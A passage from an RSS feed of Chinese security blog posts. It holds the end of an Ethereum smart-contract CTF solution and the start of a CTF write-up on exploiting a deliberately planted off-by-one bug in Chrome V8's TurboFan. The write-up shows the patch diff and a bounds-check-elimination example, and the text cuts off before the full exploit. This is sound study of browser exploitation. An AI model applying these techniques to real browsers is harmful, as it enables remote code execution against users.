zh-lightbox-thumb lazy&quot; width=&quot;879&quot; data-original=&quot;https://pic3.zhimg.com/v2-155d0a32d98fae9ce6994fb4e3b21272_r.jpg&quot; data-actualsrc=&quot;https://pic3.zhimg.com/v2-155d0a32d98fae9ce6994fb4e3b21272_b.png&quot;/&gt;&lt;/figure&gt;&lt;p class=&quot;ztext-empty-paragraph&quot;&gt;&lt;br/&gt;&lt;/p&gt;&lt;p&gt;可以看到过了这一环：&lt;/p&gt;&lt;figure data-size=&quot;normal&quot;&gt;&lt;noscript&gt;&lt;img src=&quot;https://pic4.zhimg.com/v2-4fad99e2be3078206e9349515ebecf27_b.jpg&quot; data-caption=&quot;&quot; data-size=&quot;normal&quot; data-rawwidth=&quot;381&quot; data-rawheight=&quot;829&quot; class=&quot;content_image&quot; width=&quot;381&quot;/&gt;&lt;/noscript&gt;&lt;img src=&quot;https://pic4.zhimg.com/v2-4fad99e2be3078206e9349515ebecf27_b.jpg&quot; data-caption=&quot;&quot; data-size=&quot;normal&quot; data-rawwidth=&quot;381&quot; data-rawheight=&quot;829&quot; class=&quot;content_image lazy&quot; width=&quot;381&quot; data-actualsrc=&quot;https://pic4.zhimg.com/v2-4fad99e2be3078206e9349515ebecf27_b.jpg&quot;/&gt;&lt;/figure&gt;&lt;p class=&quot;ztext-empty-paragraph&quot;&gt;&lt;br/&gt;&lt;/p&gt;&lt;p&gt;过了之后再看卡在了哪里，发现是在 0x0584 处的一个 jumpi 失败了，如果成功的话可以走到 0x05d4 ，即 transfer 的位置。&lt;/p&gt;&lt;p&gt;于是可知基本是最后一步了，分析得知最后一步是计算出的 finalFlag 如果符合&lt;/p&gt;&lt;p&gt;(finalFlag - (finalFlag / 0x03e8 * 0x03e8)) &amp;lt; 0xa，则可以通过，通过率 1%，相比于源码高了一些。&lt;/p&gt;&lt;p&gt;最后懒了没有分析 finalFlag 计算方式，已知随机量是 msg.sender，timestamp， blocknumber，直接批量生成 0x11 结尾地址，跑了十几个就出来了。&lt;/p&gt;&lt;p class=&quot;ztext-empty-paragraph&quot;&gt;&lt;br/&gt;&lt;/p&gt;&lt;p&gt;&lt;b&gt;成功的交易：&lt;/b&gt;&lt;/p&gt;&lt;p&gt;&lt;a href=&quot;https://link.zhihu.com/?target=https%3A//ropsten.etherscan.io/tx/0x59851896a46048108655f1ed0c46d51270957fae18b62b61772abff83976fd81&quot; class=&quot; external&quot; target=&quot;_blank&quot; rel=&quot;nofollow noreferrer&quot;&gt;&lt;span class=&quot;invisible&quot;&gt;https://&lt;/span&gt;&lt;span class=&quot;visible&quot;&gt;ropsten.etherscan.io/tx&lt;/span&gt;&lt;span class=&quot;invisible&quot;&gt;/0x59851896a46048108655f1ed0c46d51270957fae18b62b61772abff83976fd81&lt;/span&gt;&lt;span class=&quot;ellipsis&quot;&gt;&lt;/span&gt;&lt;/a&gt;&lt;/p&gt;&lt;figure data-size=&quot;normal&quot;&gt;&lt;noscript&gt;&lt;img src=&quot;https://pic2.zhimg.com/v2-fa83a8b8a0fa57c6e7c77c6457047d75_b.png&quot; data-caption=&quot;&quot; data-size=&quot;normal&quot; data-rawwidth=&quot;768&quot; data-rawheight=&quot;108&quot; class=&quot;origin_image zh-lightbox-thumb&quot; width=&quot;768&quot; data-original=&quot;https://pic2.zhimg.com/v2-fa83a8b8a0fa57c6e7c77c6457047d75_r.jpg&quot;/&gt;&lt;/noscript&gt;&lt;img src=&quot;https://pic2.zhimg.com/v2-fa83a8b8a0fa57c6e7c77c6457047d75_b.png&quot; data-caption=&quot;&quot; data-size=&quot;normal&quot; data-rawwidth=&quot;768&quot; data-rawheight=&quot;108&quot; class=&quot;origin_image zh-lightbox-thumb lazy&quot; width=&quot;768&quot; data-original=&quot;https://pic2.zhimg.com/v2-fa83a8b8a0fa57c6e7c77c6457047d75_r.jpg&quot; data-actualsrc=&quot;https://pic2.zhimg.com/v2-fa83a8b8a0fa57c6e7c77c6457047d75_b.png&quot;/&gt;&lt;/figure&gt;&lt;p&gt;&lt;/p&gt;</description>
<author>长小亭</author>
<guid isPermaLink="false">2019-08-05-76722414</guid>
<pubDate>Mon, 05 Aug 2019 00:00:00 +0800</pubDate>
</item>
<item>
<title>利用边界检查消除破解Chrome JIT编译器</title>
<link>https://henix.github.io/feeds/zhuanlan.chaitin-tech/2019-07-16-73081003.html</link>
<description>&lt;p&gt;&lt;a href=&quot;https://zhuanlan.zhihu.com/p/73081003&quot;&gt;原文&lt;/a&gt;&lt;/p&gt;
&lt;div class=&quot;title-image&quot;&gt;&lt;img src=&quot;https://pic3.zhimg.com/v2-59a2e77297e95f03b3e2501f86df563b_b.jpg&quot; alt=&quot;&quot;&gt;&lt;/div&gt;&lt;p&gt;本文共同作者: shiki7(&lt;a href=&quot;https://link.zhihu.com/?target=https%3A//twitter.com/Marche147&quot; class=&quot; wrap external&quot; target=&quot;_blank&quot; rel=&quot;nofollow noreferrer&quot;&gt;@Marche147&lt;/a&gt;)&lt;/p&gt;&lt;p&gt;本文将介绍一场CTF(强网杯CTF决赛)中的Chrome V8 TurboFan编译器赛题的漏洞利用。赛题由最新版本chromium修改而来。经作者引入刻意漏洞后考察选手构造v8 JIT poc及编写漏洞利用的情况。目标chromium以 --no-sandbox 模式运行，在完成远程代码执行后方可获取flag。&lt;/p&gt;&lt;p&gt;在利用过程中，我们先通过V8边界检查消除优化把编译器bug转变为数组off-by-one bug。之后通过堆排布与计算获取了稳定且可复用的 addrOf 和 fakeObj 原语。最终实现稳定的远程代码执行。&lt;/p&gt;&lt;p&gt;另外，如果你热爱此类real-world风格的CTF赛题，也请保持关注&lt;a href=&quot;https://link.zhihu.com/?target=https%3A//realworldctf.com/&quot; class=&quot; wrap external&quot; target=&quot;_blank&quot; rel=&quot;nofollow noreferrer&quot;&gt;Real World CTF&lt;/a&gt;。&lt;/p&gt;&lt;h2&gt;漏洞描述&lt;/h2&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-cpp&quot;&gt;&lt;span class=&quot;n&quot;&gt;diff&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;--&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;git&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;a&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;/&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;src&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;/&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;compiler&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;/&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;machine&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;-&lt;/span&gt;&lt;span class=&quot;k&quot;&gt;operator&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;-&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;reducer&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;cc&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;b&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;/&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;src&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;/&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;compiler&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;/&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;machine&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;-&lt;/span&gt;&lt;span class=&quot;k&quot;&gt;operator&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;-&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;reducer&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;cc&lt;/span&gt;
&lt;span class=&quot;n&quot;&gt;index&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;a6a8e87cf4&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;mf&quot;&gt;.164&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;ab44fab&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;100644&lt;/span&gt;
&lt;span class=&quot;o&quot;&gt;---&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;a&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;/&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;src&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;/&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;compiler&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;/&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;machine&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;-&lt;/span&gt;&lt;span class=&quot;k&quot;&gt;operator&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;-&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;reducer&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;cc&lt;/span&gt;
&lt;span class=&quot;o&quot;&gt;+++&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;b&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;/&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;src&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;/&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;compiler&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;/&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;machine&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;-&lt;/span&gt;&lt;span class=&quot;k&quot;&gt;operator&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;-&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;reducer&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;cc&lt;/span&gt;
&lt;span class=&quot;err&quot;&gt;@@&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;-&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;291&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;7&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;+&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;291&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;7&lt;/span&gt; &lt;span class=&quot;err&quot;&gt;@@&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;Reduction&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;MachineOperatorReducer&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;::&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;Reduce&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;Node&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;*&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;node&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
       &lt;span class=&quot;k&quot;&gt;if&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;m&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;left&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;().&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;Is&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;kMaxUInt32&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;))&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;return&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;ReplaceBool&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;false&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;  &lt;span class=&quot;c1&quot;&gt;// M &amp;lt; x =&amp;gt; false
&lt;/span&gt;&lt;span class=&quot;c1&quot;&gt;&lt;/span&gt;       &lt;span class=&quot;k&quot;&gt;if&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;m&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;right&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;().&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;Is&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;0&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;))&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;return&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;ReplaceBool&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;false&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;          &lt;span class=&quot;c1&quot;&gt;// x &amp;lt; 0 =&amp;gt; false
&lt;/span&gt;&lt;span class=&quot;c1&quot;&gt;&lt;/span&gt;       &lt;span class=&quot;k&quot;&gt;if&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;m&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;IsFoldable&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;())&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;                                    &lt;span class=&quot;c1&quot;&gt;// K &amp;lt; K =&amp;gt; K
&lt;/span&gt;&lt;span class=&quot;c1&quot;&gt;&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;-&lt;/span&gt;        &lt;span class=&quot;k&quot;&gt;return&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;ReplaceBool&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;m&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;left&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;().&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;Value&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;()&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;&amp;lt;&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;m&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;right&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;().&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;Value&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;());&lt;/span&gt;
&lt;span class=&quot;o&quot;&gt;+&lt;/span&gt;        &lt;span class=&quot;k&quot;&gt;return&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;ReplaceBool&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;m&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;left&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;().&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;Value&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;()&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;&amp;lt;&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;m&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;right&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;().&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;Value&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;()&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;+&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;1&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
       &lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;
       &lt;span class=&quot;k&quot;&gt;if&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;m&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;LeftEqualsRight&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;())&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;return&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;ReplaceBool&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;false&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;  &lt;span class=&quot;c1&quot;&gt;// x &amp;lt; x =&amp;gt; false
&lt;/span&gt;&lt;span class=&quot;c1&quot;&gt;&lt;/span&gt;       &lt;span class=&quot;k&quot;&gt;if&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;m&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;left&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;().&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;IsWord32Sar&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;()&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;&amp;amp;&amp;amp;&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;m&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;right&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;().&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;HasValue&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;())&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;这是一个非常有趣的patch，因为它只用了两个字符。它作用于一个较晚的TurboFan优化阶段: &lt;code&gt;&lt;a href=&quot;https://link.zhihu.com/?target=https%3A//cs.chromium.org/chromium/src/v8/src/compiler/machine-operator-reducer.cc%3Fg%3D0%26l%3D289&quot; class=&quot; wrap external&quot; target=&quot;_blank&quot; rel=&quot;nofollow noreferrer&quot;&gt;MachineOperatorReducer&lt;/a&gt;&lt;/code&gt; 。&lt;/p&gt;&lt;p&gt;中间表示 kUint32LessThan 用于比较两个uint32类型数字。在&lt;a href=&quot;https://link.zhihu.com/?target=https%3A//cs.chromium.org/chromium/src/v8/src/compiler/machine-operator-reducer.cc%3Fg%3D0%26l%3D289&quot; class=&quot; wrap external&quot; target=&quot;_blank&quot; rel=&quot;nofollow noreferrer&quot;&gt;MachineOperatorReducer&lt;/a&gt; 这个优化中，编译器会尝试把确定性的比较操作直接优化为一个布尔常量。例如，对于任意的 &lt;img src=&quot;https://www.zhihu.com/equation?tex=%5Ctheta&quot; alt=&quot;\theta&quot; eeimg=&quot;1&quot;/&gt; ， &lt;img src=&quot;https://www.zhihu.com/equation?tex=kMaxUint32+%3C+%5Ctheta&quot; alt=&quot;kMaxUint32 &amp;lt; \theta&quot; eeimg=&quot;1&quot;/&gt; 都会被直接折叠为 &lt;img src=&quot;https://www.zhihu.com/equation?tex=False&quot; alt=&quot;False&quot; eeimg=&quot;1&quot;/&gt; 。同样，对于常数之间的比较，编译器也会将其折叠。例如， &lt;img src=&quot;https://www.zhihu.com/equation?tex=4+%3C+4&quot; alt=&quot;4 &amp;lt; 4&quot; eeimg=&quot;1&quot;/&gt; 会被直接折叠为 &lt;img src=&quot;https://www.zhihu.com/equation?tex=False&quot; alt=&quot;False&quot; eeimg=&quot;1&quot;/&gt; 。&lt;/p&gt;&lt;p&gt;这个patch在进行折叠时引入了一个错误，因为它在判断时将右值进行了加一，导致了在一些情况下折叠会出错。例如 &lt;img src=&quot;https://www.zhihu.com/equation?tex=4+%3C+4+%28False%29&quot; alt=&quot;4 &amp;lt; 4 (False)&quot; eeimg=&quot;1&quot;/&gt; 会被当做 &lt;img src=&quot;https://www.zhihu.com/equation?tex=4+%3C+5+%28True%29&quot; alt=&quot;4 &amp;lt; 5 (True)&quot; eeimg=&quot;1&quot;/&gt; 。&lt;/p&gt;&lt;p&gt;直观上来看，这个bug并不能直接导致内存破坏，我们必须要把它转换为更强大的漏洞利用原语。&lt;/p&gt;&lt;h2&gt;边界检查消除 (Bounds Check Elimination)&lt;/h2&gt;&lt;p&gt;通过数组访问边界检查消除这个优化，先前已有很多V8 typer的bug被成功利用。(例如: CVE-2019-5782) 。因此，我们首先想到能否采用类似的方式利用这个漏洞。&lt;/p&gt;&lt;p&gt;然而，因为这种漏洞利用方式太过于方便，可以将一个很严苛的漏洞转变成数组任意越界，chrome开发者为了增强V8抵御此类漏洞的能力,决定去掉&lt;code&gt;Simplified lowering&lt;/code&gt;过程中的边界检查优化。&lt;/p&gt;&lt;p&gt;幸运的是，我们注意到依然有一些类似的bug可以利用。例如，Jeremy Fetiveau在&lt;a href=&quot;https://link.zhihu.com/?target=https%3A//doar-e.github.io/blog/2019/05/09/circumventing-chromes-hardening-of-typer-bugs/&quot; class=&quot; wrap external&quot; target=&quot;_blank&quot; rel=&quot;nofollow noreferrer&quot;&gt;他的文章&lt;/a&gt;中提到的String#lastIndexOf 漏洞的利用。在阅读其文章时，我们发现边界检查消除的漏洞利用技巧还是有机会继续使用的。&lt;/p&gt;&lt;h2&gt;寻找合适的路径消除边界检查&lt;/h2&gt;&lt;p&gt;首先，为了方便我们的分析。我们可以使用D8的--trace-turbo选项和turbolizer来查看TurboFan优化过程中的Sea of Nodes中间表示。&lt;/p&gt;&lt;p&gt;目前，尽管simplified lowering在优化时已经不再会移除 CheckBound这个节点了，但是它会把CheckBounds替换为一个CheckedUint32Bounds节点(&lt;a href=&quot;https://link.zhihu.com/?target=https%3A//cs.chromium.org/chromium/src/v8/src/compiler/simplified-lowering.cc%3Fg%3D0%26l%3D1602&quot; class=&quot; wrap external&quot; target=&quot;_blank&quot; rel=&quot;nofollow noreferrer&quot;&gt;参考代码&lt;/a&gt;)。如此一来，在Effect Control Linearization优化阶段，&lt;code&gt;CheckedUint32Bounds&lt;/code&gt;又会被进一步替换为Uint32LessThan。根据Uint32LessThan比较的结果，TurboFan会产生一个 LoadElement节点或者是一个Unreachable节点(&lt;a href=&quot;https://link.zhihu.com/?target=https%3A//cs.chromium.org/chromium/src/v8/src/compiler/effect-control-linearizer.cc%3Fg%3D0%26l%3D2376&quot; class=&quot; wrap external&quot; target=&quot;_blank&quot; rel=&quot;nofollow noreferrer&quot;&gt;参考代码&lt;/a&gt;)&lt;/p&gt;&lt;p&gt;例如，对于如下代码，&lt;/p&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-js&quot;&gt;&lt;span class=&quot;kd&quot;&gt;function&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;opt&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(){&lt;/span&gt;
	&lt;span class=&quot;kd&quot;&gt;let&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;arr&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;0&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;1&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;2&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;3&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;];&lt;/span&gt;
	&lt;span class=&quot;kd&quot;&gt;let&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;idx&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;3&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
	&lt;span class=&quot;k&quot;&gt;return&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;arr&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;idx&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;];&lt;/span&gt;
&lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;

&lt;span class=&quot;k&quot;&gt;for&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;kd&quot;&gt;var&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;i&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;0&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;i&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;&amp;lt;&lt;/span&gt; &lt;span class=&quot;mh&quot;&gt;0x10000&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;i&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;++&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
    &lt;span class=&quot;nx&quot;&gt;opt&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;()&lt;/span&gt;

&lt;span class=&quot;kd&quot;&gt;var&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;x&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;opt&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;()&lt;/span&gt;
&lt;span class=&quot;nx&quot;&gt;console&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;log&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;x&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;

&lt;span class=&quot;c1&quot;&gt;// output
&lt;/span&gt;&lt;span class=&quot;c1&quot;&gt;&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;$&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;/&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;d8&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;/&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;test&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;js&lt;/span&gt;
&lt;span class=&quot;nx&quot;&gt;$&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;3&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;&lt;br/&gt;编译器会产生如下中间表示。它正确的消除了边界检查，提供了更高的性能。&lt;/p&gt;&lt;figure data-size=&quot;normal&quot;&gt;&lt;noscript&gt;&lt;img src=&quot;https://pic4.zhimg.com/v2-8117120e5ef58d5e533f45932ccc298f_b.jpg&quot; data-size=&quot;normal&quot; data-rawwidth=&quot;2598&quot; data-rawheight=&quot;1472&quot; class=&quot;origin_image zh-lightbox-thumb&quot; width=&quot;2598&quot; data-original=&quot;https://pic4.zhimg.com/v2-8117120e5ef58d5e533f45932ccc298f_r.jpg&quot;/&gt;&lt;/noscript&gt;&lt;img src=&quot;https://pic4.zhimg.com/v2-8117120e5ef58d5e533f45932ccc298f_b.jpg&quot; data-size=&quot;normal&quot; data-rawwidth=&quot;2598&quot; data-rawheight=&quot;1472&quot; class=&quot;origin_image zh-lightbox-thumb lazy&quot; width=&quot;2598&quot; data-original=&quot;https://pic4.zhimg.com/v2-8117120e5ef58d5e533f45932ccc298f_r.jpg&quot; data-actualsrc=&quot;https://pic4.zhimg.com/v2-8117120e5ef58d5e533f45932ccc298f_b.jpg&quot;/&gt;&lt;figcaption&gt;边界检查消除过程&lt;/figcaption&gt;&lt;/figure&gt;&lt;p class=&quot;ztext-empty-paragraph&quot;&gt;&lt;br/&gt;&lt;/p&gt;&lt;p&gt;因为 &lt;img src=&quot;https://www.zhihu.com/equation?tex=%283+%3C+4%29+%5Cequiv+True&quot; alt=&quot;(3 &amp;lt; 4) \equiv True&quot; eeimg=&quot;1&quot;/&gt; ，所以在没有任何边界检查情况下，最终的机器码直接加载了数组里的元素。&lt;/p&gt;&lt;p&gt;现在，利用这个漏洞的思路已经非常清楚了：使用Uint32LessThan产生的错误结果来消除数组访问时的边界检查。&lt;/p&gt;&lt;h2&gt;常数折叠和两种绕过它的方法&lt;/h2&gt;&lt;p&gt;根据以上的思路，我们来进行初步的尝试并期望有按照我们预期的OOB数组访问出现。&lt;/p&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-js&quot;&gt;&lt;span 